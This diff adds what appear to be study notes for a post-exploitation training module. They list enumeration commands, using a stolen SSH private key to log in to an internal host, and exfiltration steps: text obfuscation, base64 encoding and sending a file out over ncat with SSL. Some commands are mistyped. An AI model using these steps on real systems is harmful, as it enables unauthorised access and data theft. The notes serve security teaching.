@@ -1,0 +1,70 @@
+1. Explain Local Host Enumeration
+
+  Windows
+  net user
+  Linux
+  cat /etc/passwd
+
+2. Demonstrate User and Process Enumeration
+
+  Windows
+  tasklist /v
+  Linux
+  ps -elf
+  ps tree
+  htop,top (live view of proccesses running)
+
+3. Demonstrate Service Enumeration
+
+  Windows
+  tasklist /svc
+  Ps: Get-CimInstance -ClassName Win32_Service
+  Linux
+  chkcnfig   #SysV
+  systemctl --type=service  #SystemD
+  
+4. Demonstrate Network Connection Enumeration 
+
+  Windows
+  ifconfig /all
+  Linux
+  ifconfig -a  ##SysV (deprecated)
+  ip a  ##SystemD
+
+5. Discuss and Demonstrate SSH Key Abuse  ##Finding private keys (id_rsa) is like finding passwords.
+                                          ##Authorized Key (Public): Grants access TO this box.
+  Fix permissions (crucial)               ##dentity Key (Private): Authenticates FROM this box to others.
+  chmod 600 stole_key                     ## 6 on chmod is Read permission for the current User
+  Authenticate using the stolen key
+  ssh -i stolen_key jane@target_internal_ip   ##Try the user who owned the key (e.g., stole from jane -> log in as jane)
+
+6. Explain Data Exfiltration Techniques
+
+  Session Transcript                                                                        ## We save input and output of what the user did on the machine into a log
+  ssh <user>@<host> | tee session.log
+
+  Obfuscation (Windows)
+  type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out   ## We changing words before encoding into base64 to make it difficult
+  certutil -encode <file> encoded.b64                                                          to be read by the adversary if they got the file.
+
+  Obfuscation (Linux)
+  cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt                                    ## Same as Windows we create a layer of obfuscation before encoding it
+  cat <file> | base64                                                                          into base64.
+
+  Encrypted Transport
+  scp <source> <destination> 
+  ncat --ssl <ip> <port> < <file>
+
+  Windows: schtasks, schedule jobs, ipconfig
+
+  Linux:
+  crontab -e, ifconfig
+  /etc/crontab  #primary system-wide file
+  /etc/cron.daily,.hourly,.weekly,.monthly #stores data
+  
+7. Demonstrate Data Obfuscation
+
+  
+
+
+8. Complete Post Exploitation Practical Exercise
